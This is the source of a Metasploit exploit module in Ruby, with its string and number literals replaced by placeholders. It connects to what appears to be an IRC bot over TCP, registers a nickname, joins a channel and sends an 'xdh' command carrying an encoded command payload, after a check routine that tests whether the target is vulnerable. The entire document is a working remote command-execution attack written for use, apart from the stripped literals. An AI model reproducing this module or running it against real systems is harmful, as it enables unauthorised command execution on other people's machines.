require <str> class Metasploit4 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: Tcp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > ARCH_CMD , <str> = > { <str> = > <int> , <str> = > true , <str> = > { <str> = > <str> } } , <str> = > [ [ <str> , { } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def check connect res = register ( sock ) if res =~ <str> || res =~ <str> vprint_error ( <str> rhost <str> rport <str> ) return Exploit :: CheckCode :: Unknown end res = join ( sock ) if ! res =~ <str> && ! res =~ <str> vprint_error ( <str> rhost <str> rport <str> datastore [ <str> ] <str> ) return Exploit :: CheckCode :: Unknown end quit ( sock ) disconnect if res =~ <str> && res =~ <str> Exploit :: CheckCode :: Vulnerable else Exploit :: CheckCode :: Safe end end def send_msg ( sock , data ) sock . put ( data ) data = <str> begin read_data = sock . get_once ( - <int> , <int> ) while ! read_data . nil? data << read_data read_data = sock . get_once ( - <int> , <int> ) end rescue :: EOFError , :: Timeout :: Error , :: Errno :: ETIMEDOUT = > e elog ( <str> e . class <str> e . message <str> e . backtrace * <str> ) end data end def register ( sock ) msg = <str> if datastore [ <str> ] && ! datastore [ <str> ] . empty? msg << <str> datastore [ <str> ] <str> end if datastore [ <str> ] . length > <int> nick = rand_text_alpha ( <int> ) print_error ( <str> nick <str> ) else nick = datastore [ <str> ] end msg << <str> nick <str> msg << <str> nick <str> Rex :: Socket . source_address ( rhost ) <str> rhost <str> nick <str> send_msg ( sock , msg ) end def join ( sock ) join_msg = <str> datastore [ <str> ] <str> send_msg ( sock , join_msg ) end def xdh_command ( sock ) encoded = payload . encoded command_msg = <str> datastore [ <str> ] <str> encoded <str> send_msg ( sock , command_msg ) end def quit ( sock ) quit_msg = <str> sock . put ( quit_msg ) end def exploit connect print_status ( <str> rhost <str> rport <str> ) res = register ( sock ) if res =~ <str> || res =~ <str> print_error ( <str> rhost <str> rport <str> ) return end print_status ( <str> rhost <str> rport <str> datastore [ <str> ] <str> ) res = join ( sock ) if ! res =~ <str> && ! res =~ <str> print_error ( <str> rhost <str> rport <str> datastore [ <str> ] <str> ) return end print_status ( <str> rhost <str> rport <str> ) xdh_command ( sock ) quit ( sock ) disconnect end end 
